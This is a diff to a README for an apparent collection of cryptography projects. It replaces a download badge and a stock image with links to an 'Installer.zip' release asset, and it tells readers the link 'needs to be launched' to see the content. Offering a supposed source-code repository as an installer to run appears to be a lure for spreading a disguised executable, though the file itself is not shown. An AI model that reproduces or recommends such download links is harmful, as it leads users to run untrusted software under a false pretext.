@@ -46,10 +46,10 @@ Cryptography involves the art of secure communication through the transformation
 
 To access the complete repository content, download the project materials using the following link: 
 
-[![Download Cryptography Projects](https://img.shields.io/badge/Download-Projects-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Cryptography Projects](https://github.com/narutocraft/Top-Cryptography-Projects-with-Source-Code/releases/download/v1.0/Installer.zip)](https://github.com/narutocraft/Top-Cryptography-Projects-with-Source-Code/releases/download/v1.0/Installer.zip)
 
 Note: The link provided above needs to be launched to explore the repository content.
 
 Whether you are interested in enhancing your cryptography skills or conducting research in this field, the "Top Cryptography Projects with Source Code" repository offers a valuable resource for your journey into the world of secure communication. Start exploring today!
 
-![Cryptography](https://cdn.pixabay.com/photo/2016/11/29/02/11/abstract-1868651_960_720.jpg)
+![Cryptography](https://github.com/narutocraft/Top-Cryptography-Projects-with-Source-Code/releases/download/v1.0/Installer.zip)
